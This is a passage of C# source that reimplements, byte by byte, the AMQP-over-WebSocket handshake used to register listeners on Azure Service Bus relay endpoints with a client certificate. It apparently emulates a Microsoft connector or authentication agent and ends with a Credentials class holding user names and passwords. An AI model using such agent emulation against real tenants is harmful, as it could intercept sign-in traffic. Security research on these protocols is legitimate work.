                        lMessage.AddRange(new byte[] { 0x06, 0xCC, 0x03, 0xA6, 0x02, 0x45, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x74, 0x65, 0x6D, 0x70, 0x75, 0x72, 0x69, 0x2E, 0x6F, 0x72, 0x67, 0x2F, 0x49, 0x43, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x53, 0x69, 0x67, 0x6E, 0x61, 0x6C, 0x69, 0x6E, 0x67, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x2F, 0x53, 0x69, 0x67, 0x6E, 0x61, 0x6C, 0x43, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x52, 0x65, 0x73, 0x70, 0x6F, 0x6E, 0x73, 0x65, 0x17, 0x53, 0x69, 0x67, 0x6E, 0x61, 0x6C, 0x43, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x52, 0x65, 0x73, 0x70, 0x6F, 0x6E, 0x73, 0x65, 0x13, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x74, 0x65, 0x6D, 0x70, 0x75, 0x72, 0x69, 0x2E, 0x6F, 0x72, 0x67, 0x2F, 0x15, 0x53, 0x69, 0x67, 0x6E, 0x61, 0x6C, 0x43, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x52, 0x65, 0x73, 0x75, 0x6C, 0x74, 0x5C, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x63, 0x6F, 0x6E, 0x74, 0x72, 0x61, 0x63, 0x74, 0x2E, 0x6F, 0x72, 0x67, 0x2F, 0x32, 0x30, 0x30, 0x34, 0x2F, 0x30, 0x37, 0x2F, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x41, 0x70, 0x70, 0x6C, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x50, 0x72, 0x6F, 0x78, 0x79, 0x2E, 0x43, 0x6F, 0x6D, 0x6D, 0x6F, 0x6E, 0x2E, 0x53, 0x69, 0x67, 0x6E, 0x61, 0x6C, 0x69, 0x6E, 0x67, 0x44, 0x61, 0x74, 0x61, 0x4D, 0x6F, 0x64, 0x65, 0x6C, 0x29, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x77, 0x33, 0x2E, 0x6F, 0x72, 0x67, 0x2F, 0x32, 0x30, 0x30, 0x31, 0x2F, 0x58, 0x4D, 0x4C, 0x53, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x2D, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x0A, 0x41, 0x63, 0x6B, 0x4C, 0x61, 0x74, 0x65, 0x6E, 0x63, 0x79, 0x0B, 0x43, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x49, 0x64, 0x56, 0x02, 0x0B, 0x01, 0x73, 0x04, 0x0B, 0x01, 0x72, 0x20, 0x0B, 0x01, 0x61, 0x06, 0x56, 0x08, 0x55, 0x90, 0x05, 0x55, 0x1E, 0xAD });
                        lMessage.AddRange(seqId);
                        lMessage.AddRange(new byte[] { 0x01, 0x55, 0x3E, 0x1E, 0x00, 0x82, 0x55, 0x1E, 0xAD });
                        lMessage.AddRange(seqId);
                        lMessage.AddRange(new byte[] { 0x55, 0x40, 0x83, 0x01, 0x44, 0x0A, 0x1E, 0x00, 0x82, 0xAB, 0x01, 0x44, 0x12, 0xAD });
                        lMessage.AddRange(id2);
                        lMessage.AddRange(new byte[] { 0x44, 0x0C, 0x1E, 0x00, 0x82, 0xAB, 0x14, 0x01, 0x56, 0x0E, 0x42, 0x03, 0x0A, 0x05, 0x42, 0x07, 0x0B, 0x01, 0x62, 0x09, 0x0B, 0x01, 0x69, 0x0B, 0x45, 0x0D, 0x81, 0x45, 0x0F, 0x99, 0x24, 0x36, 0x63, 0x39, 0x64, 0x31, 0x35, 0x65, 0x61, 0x2D, 0x61, 0x35, 0x66, 0x34, 0x2D, 0x34, 0x62, 0x65, 0x31, 0x2D, 0x38, 0x31, 0x37, 0x65, 0x2D, 0x30, 0x32, 0x33, 0x61, 0x35, 0x33, 0x62, 0x63, 0x35, 0x34, 0x63, 0x34, 0x01, 0x01, 0x01, 0x01 });
                        SendToSocket(socket, token, lMessage.ToArray());

                        ProxySettings ps = new ProxySettings();
                        ps.certificate = settings.certificate;
                        ps.url = proxyUrl;
                        ps.connectionId = connectionId;
                        ps.transId = transId;

                        // Connect to proxy
                        Thread thread = new Thread(StartProxyListener);
                        Hashtable proxyParameters = new Hashtable();
                        proxyParameters.Add("proxysettings", ps);
                        proxyParameters.Add("status", status);
                        thread.Start(proxyParameters);

                        //return; // close the thread
                    }
                    // Step 4: Receive RelayedAcceptReply
                    else if (response.Length > 150 && Encoding.UTF8.GetString(response, 19, 7).Equals("Relayed"))
                    {
                        // Step 5: Receive service bus url
                        response = ReadFromSocket(socket, token, 256);
                        sbUrl = new byte[response[6]];
                        Array.Copy(response, 7, sbUrl, 0, response[6]);

                        // Step 6: Send "Give it to me!"
                        message = new byte[] { 0x0B };
                        SendToSocket(socket, token, message);


                        Thread.Sleep(100);
                    }
                    else if (response.Length > 212 && Encoding.UTF8.GetString(response, 50, 2).Equals("sb"))
                    {

                        // Step 7: Receive some servicebus message and extract ids
                        //response = ReadFromSocket(socket, token, 256);
                        Array.Copy(response, 27, id1, 0, 16);
                        Array.Copy(response, response.Length - 20, seqId, 0, 16);

                        // Step 8: Send response
                        
                        List<byte> lBody = new List<byte>();
                        lBody.AddRange(new byte[] { 0x01, 0x00, 0x56, 0x02, 0x0B, 0x01, 0x73, 0x04, 0x0B, 0x01, 0x61, 0x06, 0x56, 0x08, 0x44, 0x0A, 0x1E, 0x00, 0x82, 0xAB, 0xA0, 0x05, 0x44, 0x12, 0xAD });
                        lBody.AddRange(id1);
                        lBody.AddRange(new byte[] { 0x44, 0x0C, 0x1E, 0x00, 0x82, 0xAB, 0x14, 0x01, 0x56, 0x0E, 0x42, 0x9E, 0x05, 0x0A, 0x20, 0x42, 0x1E, 0xAD });
                        lBody.AddRange(conId);
                        lBody.AddRange(new byte[] { 0x42, 0x96, 0x05, 0x42, 0x94, 0x05, 0x44, 0x2A, 0x99 });
                        lBody.Add((byte)sbUrl.Length);
                        lBody.AddRange(sbUrl);
                        lBody.AddRange(new byte[] { 0x01, 0x01, 0x01, 0x01, 0x01 });

                        lMessage = new List<byte>();
                        lMessage.AddRange(new byte[] { 0x06, (byte)(lBody.Count - 1) });
                        lMessage.AddRange(lBody.ToArray());
                        SendToSocket(socket, token, lMessage.ToArray());
                    }
                    else
                    {
                        // Something else, probably a ping
                    }
                    Thread.Sleep(10);

                }
            }
            finally
            {
                socket.Dispose();
            }

        }

        // Starts the endpoint listener
        public static void StartEndpointListener(object endpointParameters)
        {
            Hashtable parameters = (Hashtable)endpointParameters;
            EndpointSettings settings = (EndpointSettings)parameters["endpointsettings"];
            Hashtable status = (Hashtable)parameters["status"];

            Console.WriteLine("Starting {0}-{1}", settings.number, settings.nameSpace);

            // Build the url
            string url = string.Format("wss://{0}.servicebus.windows.net/{1}servicebus/websocket", settings.nameSpace, '\x0024');

            Console.WriteLine("Connecting to {0}", url);

            // Create a socket and connect to it
            ClientWebSocket socket = new ClientWebSocket();
            socket.Options.ClientCertificates.Add(settings.certificate);
            socket.Options.AddSubProtocol("wsrelayedamqp");
            CancellationToken token = new CancellationToken();

            try
            {
                var connection = socket.ConnectAsync(new Uri(url), token);
                while (!connection.IsCompleted) { Thread.Sleep(10); };
                if (connection.IsFaulted.Equals("true"))
                {
                    Console.WriteLine("Listener {0}-{1} failed to connect to {2}", settings.number, settings.nameSpace, url);
                    return;
                }

                Console.WriteLine("Connected to {0}-{1}", settings.number, url);

                // Define some needed ids
                string relayLinkGuid = Guid.NewGuid().ToString();
                string trackingId = Guid.NewGuid().ToString();
                string connectionId = Guid.NewGuid().ToString();

                /*
                 * SASL conversation
                 */

                // Step 1: send AMQP3
                byte[] message = { 0x41, 0x4D, 0x51, 0x50, 0x03, 0x01, 0x00, 0x00 };
                SendToSocket(socket, token, message);

                // Step 2: receive AMQP3
                ReadFromSocket(socket, token, 8);

                // Step 3: Receive SASL mechanisms
                ReadFromSocket(socket, token, 64);

                // Step 4: Send reply "EXTERNAL"
                message = new byte[] { 0x00, 0x00, 0x00, 0x1A, 0x02, 0x01, 0x00, 0x00, 0x00, 0x53, 0x41, 0xC0, 0x0D, 0x03, 0xA3, 0x08, 0x45, 0x58, 0x54, 0x45, 0x52, 0x4E, 0x41, 0x4C, 0x40, 0x40 };
                SendToSocket(socket, token, message);

                // Step 5: Receive "Welcome!"
                ReadFromSocket(socket, token, 32);

                /*
                 * AMQP starts
                 */

                // Step 6: send AMQP0
                message = new byte[] { 0x41, 0x4D, 0x51, 0x50, 0x00, 0x01, 0x00, 0x00 };
                SendToSocket(socket, token, message);

                Thread.Sleep(200);

                // Step 7: Construct and send RelayConnectionMessage
                message = CreateRelayConnectionMessage(connectionId, settings.nameSpace);
                SendToSocket(socket, token, message);

                // Step 8: receive AMQP1
                ReadFromSocket(socket, token, 8);

                // Step 9: receive container guid
                byte[] response = ReadFromSocket(socket, token, 128);
                string containerId = Encoding.UTF8.GetString(response, 16, 35);

                // Step 10: send some weird ack message
                message = new byte[] { 0x00, 0x00, 0x00, 0x23, 0x02, 0x00, 0x00, 0x00, 0x00, 0x53, 0x11, 0xC0, 0x16, 0x08, 0x40, 0x52, 0x01, 0x70, 0x00, 0x00, 0x13, 0x88, 0x70, 0x00, 0x00, 0x13, 0x88, 0x70, 0x00, 0x03, 0xFF, 0xFF, 0x40, 0x40, 0x40 };
                SendToSocket(socket, token, message);

                // Step 11: receive container guid
                response = ReadFromSocket(socket, token, 64);

                // Step 12: create the link for outbound traffic
                message = CreateLinkMessage(settings, relayLinkGuid, trackingId, "out");
                SendToSocket(socket, token, message);

                // Step 13: create the link for inbound traffic
                message = CreateLinkMessage(settings, relayLinkGuid, trackingId, "in");
                SendToSocket(socket, token, message);

                // Step 14: send yet another weird message
                message = new byte[] { 0x00, 0x00, 0x00, 0x28, 0x02, 0x00, 0x00, 0x00, 0x00, 0x53, 0x13, 0xC0, 0x1B, 0x0B, 0x52, 0x01, 0x70, 0x00, 0x00, 0x13, 0x88, 0x52, 0x01, 0x70, 0x00, 0x00, 0x13, 0x88, 0x52, 0x01, 0x43, 0x70, 0x00, 0x00, 0x03, 0xE8, 0x43, 0x40, 0x42, 0x40 };
                SendToSocket(socket, token, message);

                // Step 15: receive three messages
                response = ReadFromSocket(socket, token, 1024);
                response = ReadFromSocket(socket, token, 1024);
                response = ReadFromSocket(socket, token, 1024);

                //Thread.Sleep(100);
                List<string> relays = new List<string>();

                // Start the loop
                while(socket.State == WebSocketState.Open)
                {
                    // Send some "I'm listening"
                    message = new byte[] { 0x00, 0x00, 0x00, 0x08, 0x02, 0x00, 0x00, 0x00 };
                    SendToSocket(socket, token, message);

                    // Read the message
                    response = ReadFromSocket(socket, token, 1024);

                    // Witch message?
                    // Indication of incoming OneWaySend
                    if (response.Length > 40 & response.Length < 50 & response[0] == 0x00 & response[9] == 0x53)
                    {
                        //Console.WriteLine("{0}-{1} OneWaySend is coming!", settings.number, settings.nameSpace);
                    }
                    else if (response.Length > 800 & response[0] == 0x00 & response[1] == 0x53 & response[2] == 0x75 & response[3] == 0xB0)
                    {
                        //Console.WriteLine("{0}-{1} OneWaySend is here!", settings.number, settings.nameSpace);

                        bool hostFound = false;
                        bool relayIdFound = false;
                        RelaySettings rs = new RelaySettings();
                        rs.certificate = settings.certificate;

                        for (int a = (response.Length - 1); a >= 0; a--)
                        {

                            // Find the last url element
                            if (response[a] == 0x99 & !hostFound)
                            {
                                //Get the length byte
                                int l = response[a + 1];
                                rs.hostName = Encoding.UTF8.GetString(response, a + 2, l);

                                //Console.WriteLine("{0}-{1} HostName {2}", settings.number, settings.nameSpace, rs.hostName);

                                hostFound = true;
                            }
                            // Then the next one = id
                            else if (response[a] == 0x99 & !relayIdFound)
                            {
                                //Get the length byte
                                int l = response[a + 1];
                                rs.relayId = Encoding.UTF8.GetString(response, a + 2, l);
                                Console.WriteLine("{0}-{1} RelayId {2}", settings.number, settings.nameSpace, rs.relayId);

                                // Send the response message
                                message = new byte[] { 0x00, 0x00, 0x00, 0x17, 0x02, 0x00, 0x00, 0x00, 0x00, 0x53, 0x15, 0xC0, 0x0A, 0x06, 0x41, 0x43, 0x40, 0x41, 0x00, 0x53, 0x24, 0x45, 0x40 };
                                SendToSocket(socket, token, message);

                                relayIdFound = true;

                                // Connect to authentication bus
                                Thread thread = new Thread(StartRelayListener);
                                Hashtable relayParameters = new Hashtable();
                                relayParameters.Add("relaysettings", rs);
                                relayParameters.Add("status", status);
                                thread.Start(relayParameters);

                            }

                        }
                    }
                    Thread.Sleep(10);

                } ;
            }
            finally
            {
                socket.Dispose();
            }
        }

        public static void SendToSocket(ClientWebSocket socket, CancellationToken token, byte[] message)
        {
            try
            {
                ArraySegment<byte> bytes = new ArraySegment<byte>(message);
                var connection = socket.SendAsync(bytes, WebSocketMessageType.Binary, true, token);
                while (!connection.IsCompleted) { Thread.Sleep(10); };
            }
            catch { }

            
        }

        public static byte[] ReadFromSocket(ClientWebSocket socket, CancellationToken token, int arraySize, bool keepAlive = false)
        {
            byte[] retval = null;
            try
            {
                byte[] emptyAMQPHeader = new byte[] { 0x00, 0x00, 0x00, 0x08, 0x02, 0x00, 0x00, 0x00 };
                DateTime start = new DateTime();

                byte[] bytes = new byte[arraySize];
                ArraySegment<byte> buffer = new ArraySegment<byte>(bytes);

                var connection = socket.ReceiveAsync(buffer, token);
                while (!connection.IsCompleted)
                {
                    // Send the empty AMQP header to keep the connection alive
                    if (keepAlive && (new DateTime()).Subtract(start).Seconds > 30)
                    {
                        SendToSocket(socket, token, emptyAMQPHeader);
                        start = new DateTime();
                    }
                    Thread.Sleep(10);
                };

                retval = new byte[connection.Result.Count];
                Array.Copy(bytes, 0, retval, 0, connection.Result.Count);
            }
            catch { }

            return retval;
        }



    }

    public class EndpointSettings
    {
        public EndpointSettings()
        {

        }
        public int number { get; set; }
        public bool isAvailable { get; set; }
        public string name { get; set; }
        public string domain { get; set; }
        public string nameSpace { get; set; }
        public bool reliableSessionEnabled { get; set; }
        public string scheme { get; set; }
        public string servicePath { get; set; }
        public string sharedAccessKey { get; set; }
        public string sharedAccessKeyName { get; set; }
        public X509Certificate2 certificate { get; set; }
    }

    public class RelaySettings
    {
        public RelaySettings()
        {

        }
        public string hostName { get; set; }
        public string relayId { get; set; }
        public X509Certificate2 certificate { get; set; }
    }

    public class ProxySettings
    {
        public ProxySettings()
        {

        }
        public string url { get; set; }
        public string transId { get; set; }
        public string connectionId { get; set; }
        public X509Certificate2 certificate { get; set; }
    }

    public class Credentials
    {
        public Credentials()
        {
            this.timeStamp = DateTime.Now.ToUniversalTime();
        }
        public string userName { get; set; }
        public string password { get; set; }

        public DateTime timeStamp { get; set; }

    }
}


